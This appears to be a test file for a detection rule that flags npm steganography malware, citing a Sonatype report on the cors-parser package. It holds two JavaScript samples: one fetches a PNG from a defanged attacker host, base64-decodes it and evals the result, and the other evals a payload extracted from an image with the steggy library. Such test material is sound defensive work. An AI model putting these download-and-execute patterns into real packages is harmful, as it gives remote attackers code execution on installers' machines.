// ref: https://www.sonatype.com/blog/cors-parser-npm-package-hides-cross-platform-backdoor-in-png-files
function f() {
  const t = "base64",
      c = "utf8",
      ht = require("https"),
      cors = () => {
          const request = ht["get"]("hxxps://api.jz-aws[.]info/initial.png", 
          function(response) {
              let data = "";
              response.on(data, r => {
                  data += r
              });
              response.on(data, (() => {
                  let plain = Buffer.from(data, t).toString();
                  // ruleid: npm-steganography
                  eval(plain)
              }));
          });
      };
  module.exports = cors;
}


function f() {
    const fs = require('fs')
    const steggy = require('steggy')

    const image = fs.readFileSync('./path/to/image.png')
    // Returns a string if encoding is provided, otherwise a buffer
    const revealed = steggy.reveal()(image)
    // ruleid: npm-steganography
    eval(revealed.toString())
}
